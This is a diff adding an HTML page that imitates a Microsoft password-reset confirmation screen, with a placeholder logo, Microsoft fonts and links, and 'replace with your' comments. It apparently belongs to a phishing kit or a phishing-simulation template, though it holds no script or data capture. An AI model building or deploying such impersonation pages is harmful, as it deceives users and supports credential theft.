@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Password Reset Form</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Background image */
+        .background {
+            background-image: url('bkgd.png'); /* Replace with your background image */
+            background-size: cover;
+            background-position: center;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Form styling */
+        .form-container {
+            background: rgba(255, 255, 255, 0.9); /* Semi-transparent background */
+            padding: 10px 20px;
+            border-radius: 0px;
+            width: 90%;
+            max-width: 400px;
+            text-align: left;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+			font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        .form-container img {
+            max-width: 100px; /* Logo size */
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 0px;
+            font-size: 12px;
+        }
+    .legal-copy {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      color: #989696;
+      text-align: center;
+      padding: 10px 20px;
+      font-size: 10px;
+      z-index: 1000;
+    }
+        /* Button styling */
+        .form-container button {
+            padding: 10px 15px;
+            margin: 10px 0;
+            background-color: #00a1e1;
+            color: white;
+            border: none;
+            border-radius: 0px;
+            cursor: pointer;
+            font-size: 14px;
+            text-align: center; /* Ensures the button aligns right */
+			width: 100%;
+        }
+
+        .form-container button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Responsive design */
+        @media (max-width: 600px) {
+            .form-container {
+                padding: 15px;
+            }
+
+            .form-container input,
+            .form-container button {
+                font-size: 14px;
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="background">
+        <div class="form-container">
+			<img src="MS_Logo2.png" alt="Logo"><br> <!-- Replace with your logo -->
+			<p style="margin-bottom: 20px; font-size: 18px; font-weight: 500">Thank you!</p><p style="padding-bottom: 20px">Your password has been successfully updated.</p>
+        </div>
+    </div>
+	<div class="legal-copy">
+		<a href="https://www.microsoft.com/en-ca/servicesagreement/default.aspx" style="color:#989696; text-decoration: none; font-weight: 600">Terms of use</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://go.microsoft.com/fwlink/?LinkID=521839" style="color:#989696; text-decoration: none; font-weight: 600">Privacy and cookies</a><br><p style="font-size: 9px; margin-top: 10px">Use private browsing if this is not your device. <a href="https://go.microsoft.com/fwlink/?LinkID=521839" style="color:#0E2D87; text-decoration: none">Learn more</a></p>
+  </div>	
+</body>
+</html>
+
